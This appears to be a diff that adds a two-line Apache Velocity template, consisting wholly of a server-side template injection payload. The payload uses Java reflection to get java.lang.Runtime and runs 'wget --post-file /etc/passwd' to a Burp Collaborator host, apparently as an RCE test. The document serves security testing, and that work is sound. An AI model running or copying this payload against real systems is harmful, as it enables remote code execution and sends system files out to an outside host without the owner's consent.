@@ -1,0 +1,2 @@
+#set($i18n="i18n")
+$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('wget --post-file /etc/passwd http://5bhqqq7qfuiaoqtwzwgwi16tmkscg1.burpcollaborator.net/rcetest?a=a').waitFor()
